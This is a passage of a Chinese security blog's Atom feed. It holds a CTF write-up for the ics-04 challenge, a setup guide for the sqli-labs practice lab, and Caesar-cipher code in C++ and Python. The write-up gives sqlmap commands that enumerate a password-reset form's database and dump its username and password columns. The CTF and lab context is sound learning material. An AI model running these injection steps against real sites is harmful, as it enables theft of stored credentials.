      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/categories/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ics-04</title>
    <link href="https://singlemindedt.github.io/2019/12/09/ics-04/"/>
    <id>https://singlemindedt.github.io/2019/12/09/ics-04/</id>
    <published>2019-12-09T00:28:33.000Z</published>
    <updated>2019-12-09T02:18:26.771Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ics-04"><a href="#ics-04" class="headerlink" title="ics-04"></a>ics-04</h1><p>本题和之前几题使用了相同的页面，根据提示漏洞位置应该在登录和注册上，随便注册都能成功，但是登录时提示“普通用户登录成功，没什么用”；<br><img src="https://s2.ax1x.com/2019/12/09/QdHOVP.png" alt="QdHOVP.png"><br>尝试sql注入，这两个地方并没有什么注入点，看到还有个“忘记密码？”，可以正常使用找回密码，尝试sql注入；利用sqlmap检测，发现存在漏洞；<br>构造命令猜解数据库名：–dbs 枚举数据库管理系统数据库<br>sqlmap -u “<a href="http://111.198.29.45:33931/findpwd.php&quot;" target="_blank" rel="noopener">http://111.198.29.45:33931/findpwd.php&quot;</a> –data=”username=1” –dbs<br>得到库名结果；<br><img src="https://s2.ax1x.com/2019/12/09/QdHXUf.png" alt="QdHXUf.png"><br>库名<br>对每个数据库进行表名猜解；<br>sqlmap -u  “<a href="http://111.198.29.45:33931/findpwd.php&quot;" target="_blank" rel="noopener">http://111.198.29.45:33931/findpwd.php&quot;</a> –data=”username=1” -D cetc004 –tables<br> <img src="https://s2.ax1x.com/2019/12/09/QdH5CD.png" alt="QdH5CD.png"><br>对数据库cetc004中表user猜解列名；–columns 枚举DBMS数据库表列<br>sqlmap -u  “<a href="http://111.198.29.45:33931/findpwd.php&quot;" target="_blank" rel="noopener">http://111.198.29.45:33931/findpwd.php&quot;</a> –data=”username=1” -D cetc004 -T user –columns<br><img src="https://s2.ax1x.com/2019/12/09/QdHHKA.png" alt="QdHHKA.png"><br>对username和password进行内容查询；–dump 转储数据库管理系统的数据库中的表项<br>sqlmap -u  “<a href="http://111.198.29.45:33931/findpwd.php&quot;" target="_blank" rel="noopener">http://111.198.29.45:33931/findpwd.php&quot;</a> –data=”username=1” -D cetc004 -T user -C “username,password” –dump<br> <img src="https://s2.ax1x.com/2019/12/09/QdHfUK.png" alt="QdHfUK.png"><br>由于可以重复注册，于是使用c3tlwDmln23注册，注册成功，登陆后得到flag；<br> <img src="https://s2.ax1x.com/2019/12/09/QdHTvd.png" alt="QdHTvd.png"><br>此时对username查询可得到两条结果；<br><img src="https://s2.ax1x.com/2019/12/09/QdHbDI.png" alt="QdHbDI.png"><br>第一行为原来的，第二行为刚才注册的，所以漏洞原因为未对用户名重复问题加以过滤，造成数据库查表错误；<br>注：如果觉得打开Kali虚拟机麻烦，可以在Windows上安装一个sqlmap，具体步骤网上都有教程；如果遇到“不是内部或外部命令，也不是可运行的程序 或批处理文件。”时，看一下自己的“起始位置”的路径，是不是没有指定清楚，如果填写的是C:\Python27\sqlmap；那么请查看sqlmap下到sqlmap python File是否还有间接文件夹，若有直接加上\name；或者直接复制改名为sqlmap放在Python27下；删除原来的文件；<br>关于sqlmap使用：<a href="https://blog.csdn.net/qq_33530840/article/details/82144515" target="_blank" rel="noopener">https://blog.csdn.net/qq_33530840/article/details/82144515</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ics-04&quot;&gt;&lt;a href=&quot;#ics-04&quot; class=&quot;headerlink&quot; title=&quot;ics-04&quot;&gt;&lt;/a&gt;ics-04&lt;/h1&gt;&lt;p&gt;本题和之前几题使用了相同的页面，根据提示漏洞位置应该在登录和注册上，随便注册都能成功，但是登录时提示“普通用
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/categories/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs环境搭建</title>
    <link href="https://singlemindedt.github.io/2019/12/02/sqli-labs%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://singlemindedt.github.io/2019/12/02/sqli-labs环境搭建/</id>
    <published>2019-12-02T02:01:08.000Z</published>
    <updated>2019-12-18T00:15:04.327Z</updated>
    
    <content type="html"><![CDATA[<p>##1.由于版本支持等问题，此次环境安装建议下载Phpstudy2018版本，解压安装(可自定义安装目录)；</p><p>##2.下载sqli-labs文件，Github下载解压至Phpstudy2018\PHPTutorial\WWW目录下；</p><p>##3.更改数据库密码，E:\PhpStudy2018\PHPTutorial\WWW\sqli-labs-master\sqli-labs-master\sql-connections\db-creds,自己任意设置；</p><p>##4.开启Phpstudy2018的Apache和MySql服务;</p><p>##5.基本配置完成，打开<a href="http://127.0.0.1/sqli-labs-master/，若出现如下页面则搭建成功；" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/，若出现如下页面则搭建成功；</a></p><p><img src="https://s2.ax1x.com/2019/12/09/Qwmxv4.png" alt="Qwmxv4.png"></p><p>##6.点击Setup/reset Database for labs建立数据库连接，若出现如下页面则搭建完成；<br>[^_^]:(sql1/images/sql1.png)<br><img src="https://s2.ax1x.com/2019/12/09/Qwn9bR.png" alt="Qwn9bR.png"></p><p>##7.访问<a href="http://127.0.0.1/sqli-labs-master/" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs-master/</a> 时，若出现<strong>You don’t have permission to access /sqli-labs-master/ on this server.</strong>；则打开Phpstudy2018的“其他选项菜单\打开配置文件\httpd.conf”;配置为如下情况；<br>[^_^]: # (sql2/images/sql2.png)<br><img src="https://s2.ax1x.com/2019/12/09/Qwmv2F.png" alt="Qwmv2F.png"><br>同时将“phpstudy设置”设置为“允许目录列表”；<br>至此，sqli-labs环境搭建完成！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;##1.由于版本支持等问题，此次环境安装建议下载Phpstudy2018版本，解压安装(可自定义安装目录)；&lt;/p&gt;
&lt;p&gt;##2.下载sqli-labs文件，Github下载解压至Phpstudy2018\PHPTutorial\WWW目录下；&lt;/p&gt;
&lt;p&gt;##3.更改
      
    
    </summary>
    
      <category term="SQL" scheme="https://singlemindedt.github.io/categories/SQL/"/>
    
    
      <category term="SQL" scheme="https://singlemindedt.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>C++/Python实现凯撒密码</title>
    <link href="https://singlemindedt.github.io/2019/11/16/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/"/>
    <id>https://singlemindedt.github.io/2019/11/16/凯撒密码/</id>
    <published>2019-11-16T14:18:05.000Z</published>
    <updated>2019-12-17T13:18:28.419Z</updated>
    
    <content type="html"><![CDATA[<h1 id="凯撒密码C"><a href="#凯撒密码C" class="headerlink" title="凯撒密码C++"></a>凯撒密码C++</h1><p>  在密码学中，恺撒密码（英语：Caesar cipher），或称恺撒加密、恺撒变换、变换加密，是一种最简单且最广为人知的加密技术。它是一种替换加密的技术，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以罗马共和时期恺撒的名字命名的，当年恺撒曾用此方法与其将军们进行联系。</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>  (已知密钥情况下)<br>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Encryption</span><span class="params">(<span class="built_in">string</span> C,<span class="keyword">int</span> key,<span class="keyword">int</span> model)</span></span>;<span class="comment">//加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decryption</span><span class="params">(<span class="built_in">string</span> M,<span class="keyword">int</span> key,<span class="keyword">int</span> model)</span></span>;<span class="comment">//解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">string</span> C;</span><br><span class="line"><span class="keyword">int</span> key;</span><br><span class="line"><span class="keyword">int</span> model;</span><br><span class="line"><span class="comment">//int len;//字符串长度 </span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Model:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"1:Encry"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"2:Decry"</span>&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;model;</span><br><span class="line"><span class="keyword">if</span>(model==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter the content to be encrypted:"</span>; </span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;C;</span><br><span class="line"><span class="comment">//len=strlen(C);//错误:C需要转换为char*类型 </span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter key :"</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;key;</span><br><span class="line">Encryption(C,key,model);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(model==<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter the content to be decrypted:"</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;C;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter key :"</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;key;</span><br><span class="line">Decryption(C,key,model);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;<span class="string">"Error!"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Encryption</span><span class="params">(<span class="built_in">string</span> C,<span class="keyword">int</span> key,<span class="keyword">int</span> model)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(model==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;C.length();i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(C[i]&gt;=<span class="string">'A'</span>&amp;&amp;C[i]&lt;=<span class="string">'Z'</span>)</span><br><span class="line">C[i]=<span class="string">'A'</span>+(C[i]-<span class="string">'A'</span>+key)%<span class="number">26</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(C[i]&gt;=<span class="string">'a'</span>&amp;&amp;C[i]&lt;=<span class="string">'z'</span>)</span><br><span class="line">C[i]=<span class="string">'a'</span>+(C[i]-<span class="string">'a'</span>+key)%<span class="number">26</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"The result of the encryption is："</span>&lt;&lt;C&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Error！"</span>&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decryption</span><span class="params">(<span class="built_in">string</span> M,<span class="keyword">int</span> key,<span class="keyword">int</span> model)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(model==<span class="number">2</span>)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;M.length(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(M[i] &gt;= <span class="string">'A'</span> &amp;&amp; M[i] &lt;= <span class="string">'Z'</span>)</span><br><span class="line">                M[i] = <span class="string">'A'</span>+(M[i]-<span class="string">'A'</span>-key+<span class="number">26</span>)%<span class="number">26</span>;<span class="comment">//M[i]='A'+(M[i]-'A'+(26-key))</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(M[i] &gt;= <span class="string">'a'</span> &amp;&amp; M[i] &lt;= <span class="string">'z'</span>)</span><br><span class="line">                M[i] = <span class="string">'a'</span>+(M[i]-<span class="string">'a'</span>-key+<span class="number">26</span>)%<span class="number">26</span>;<span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">cout</span>&lt;&lt;<span class="string">"The result of the decryption is:"</span>&lt;&lt;M&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"Error！"</span>&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><hr><p>完整版（就是穷举了key）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Encryption</span><span class="params">(<span class="built_in">string</span> C,<span class="keyword">int</span> key,<span class="keyword">int</span> mode)</span></span>;<span class="comment">//加密函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decryption</span><span class="params">(<span class="built_in">string</span> M,<span class="keyword">int</span> key,<span class="keyword">int</span> mode)</span></span>;<span class="comment">//解密函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">string</span> C;</span><br><span class="line"><span class="keyword">int</span> key;<span class="comment">//偏移位 </span></span><br><span class="line"><span class="keyword">int</span> mode;</span><br><span class="line"><span class="comment">//int len;//字符串长度 </span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Mode:(Please enter selection mode！！！)"</span>&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"1:Encry"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"2:Decry"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"3:Keyless Decryption"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;mode;</span><br><span class="line"><span class="keyword">if</span>(mode==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter the content to be encrypted:"</span>; </span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;C;</span><br><span class="line"><span class="comment">//len=strlen(C);//错误:C需要转换为char*类型 </span></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter key :"</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;key;</span><br><span class="line">Encryption(C,key,mode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(mode==<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter the content to be decrypted:"</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;C;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter key :"</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;key;</span><br><span class="line">Decryption(C,key,mode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(mode==<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Please enter the content to be decrypted:"</span>;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;C;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;<span class="number">26</span>;k++)</span><br><span class="line">Decryption(C,k,mode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;<span class="string">"Error!"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Encryption</span><span class="params">(<span class="built_in">string</span> C,<span class="keyword">int</span> key,<span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//if(mode==1)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;C.length();i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(C[i]&gt;=<span class="string">'A'</span>&amp;&amp;C[i]&lt;=<span class="string">'Z'</span>)</span><br><span class="line">C[i]=<span class="string">'A'</span>+(C[i]-<span class="string">'A'</span>+key)%<span class="number">26</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(C[i]&gt;=<span class="string">'a'</span>&amp;&amp;C[i]&lt;=<span class="string">'z'</span>)</span><br><span class="line">C[i]=<span class="string">'a'</span>+(C[i]-<span class="string">'a'</span>+key)%<span class="number">26</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"The result of the encryption is："</span>&lt;&lt;C&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//else</span></span><br><span class="line"><span class="comment">//cout&lt;&lt;"Error！"&lt;&lt;endl; </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decryption</span><span class="params">(<span class="built_in">string</span> M,<span class="keyword">int</span> key,<span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//if(mode==2)</span></span><br><span class="line"> <span class="comment">//&#123;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;M.length(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(M[i] &gt;= <span class="string">'A'</span> &amp;&amp; M[i] &lt;= <span class="string">'Z'</span>)</span><br><span class="line">                M[i] = <span class="string">'A'</span>+(M[i]-<span class="string">'A'</span>-key+<span class="number">26</span>)%<span class="number">26</span>;<span class="comment">//M[i]='A'+(M[i]-'A'+(26-key))</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(M[i] &gt;= <span class="string">'a'</span> &amp;&amp; M[i] &lt;= <span class="string">'z'</span>)</span><br><span class="line">                M[i] = <span class="string">'a'</span>+(M[i]-<span class="string">'a'</span>-key+<span class="number">26</span>)%<span class="number">26</span>;<span class="comment">//...</span></span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">cout</span>&lt;&lt;<span class="string">"The result of the decryption is:"</span>&lt;&lt;M&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">      <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">  <span class="comment">//&#125;</span></span><br><span class="line">  <span class="comment">//  else</span></span><br><span class="line">  <span class="comment">//  cout&lt;&lt;"Error！"&lt;&lt;endl; </span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p> #凯撒密码Python<br> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Encryption</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Encryption</span><span class="params">(C,key,mode)</span>:</span></span><br><span class="line">    C_list=list(C)</span><br><span class="line">    C_list_encry=C_list</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;len(C_list ):</span><br><span class="line">        <span class="keyword">if</span>(ord(C_list[i])&gt;=<span class="number">65</span> <span class="keyword">and</span> ord(C_list[i])&lt;=<span class="number">90</span>):</span><br><span class="line">            C_list_encry[i]=chr(<span class="number">65</span>+(ord(C_list[i])<span class="number">-65</span>+key)%<span class="number">26</span>)</span><br><span class="line">        <span class="keyword">if</span> (ord(C_list[i])&gt;=<span class="number">97</span> <span class="keyword">and</span> ord(C_list[i]) &lt;= <span class="number">122</span>):</span><br><span class="line">            C_list_encry[i] = chr(<span class="number">97</span>+ (ord(C_list[i]) - <span class="number">97</span> + key) % <span class="number">26</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    print(<span class="string">"The result of the encryption is："</span>+<span class="string">""</span>.join(C_list_encry ))</span><br><span class="line"><span class="comment">#Decryption</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decryption</span><span class="params">(C,key,mode)</span>:</span></span><br><span class="line">    C_list = list(C)</span><br><span class="line">    C_list_decry = C_list</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; len(C_list):</span><br><span class="line">        <span class="keyword">if</span> (ord(C_list[i]) &gt;= <span class="number">65</span> <span class="keyword">and</span> ord(C_list[i]) &lt;= <span class="number">90</span>):</span><br><span class="line">            C_list_decry[i] = chr(<span class="number">65</span> + (ord(C_list[i])<span class="number">-65</span>-key+<span class="number">26</span>) % <span class="number">26</span>)</span><br><span class="line">        <span class="keyword">if</span> (ord(C_list[i]) &gt;= <span class="number">97</span> <span class="keyword">and</span> ord(C_list[i]) &lt;= <span class="number">122</span>):</span><br><span class="line">            C_list_decry[i] = chr(<span class="number">97</span> + (ord(C_list[i]) - <span class="number">97</span>-key+<span class="number">26</span>) % <span class="number">26</span>)</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    print(<span class="string">"The result of the decryption is:"</span>+<span class="string">""</span>.join(C_list_decry))</span><br><span class="line"><span class="comment">#main()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        print(<span class="string">"Mode:(Please select mode！！！)"</span>)</span><br><span class="line">        print(<span class="string">"1:Encry"</span>)</span><br><span class="line">        print(<span class="string">"2:Decry"</span>)</span><br><span class="line">        print(<span class="string">"3:Keyless Decryption"</span>)</span><br><span class="line">        mode=input ()</span><br><span class="line">        <span class="keyword">if</span> mode==<span class="string">"1"</span>:</span><br><span class="line">            print(<span class="string">"Please enter the content to be encrypted:"</span>)</span><br><span class="line">            C=input()</span><br><span class="line">            print(<span class="string">"Please enter key:"</span>)</span><br><span class="line">            key = int(input())</span><br><span class="line">            key=key%<span class="number">26</span></span><br><span class="line">            Encryption(C, key, mode)</span><br><span class="line">        <span class="keyword">if</span> mode==<span class="string">"2"</span>:</span><br><span class="line">            print(<span class="string">"Please enter the content to be decrypted:"</span>)</span><br><span class="line">            C=input()</span><br><span class="line">            print(<span class="string">"Please enter key :"</span>)</span><br><span class="line">            key=int(input())</span><br><span class="line">            key = key % <span class="number">26</span></span><br><span class="line">            Decryption(C, key, mode)</span><br><span class="line">        <span class="keyword">if</span> mode==<span class="string">"3"</span>:</span><br><span class="line">            print(<span class="string">"Please enter the content to be decrypted:"</span>)</span><br><span class="line">            C=input()</span><br><span class="line">            key=<span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> key&lt;<span class="number">26</span>:</span><br><span class="line">                Decryption(C, key, mode)</span><br><span class="line">                key+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> mode!=<span class="string">"1"</span><span class="keyword">and</span> mode!=<span class="string">"2"</span> <span class="keyword">and</span> mode!=<span class="string">"3"</span>:</span><br><span class="line">            print(<span class="string">"Error!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 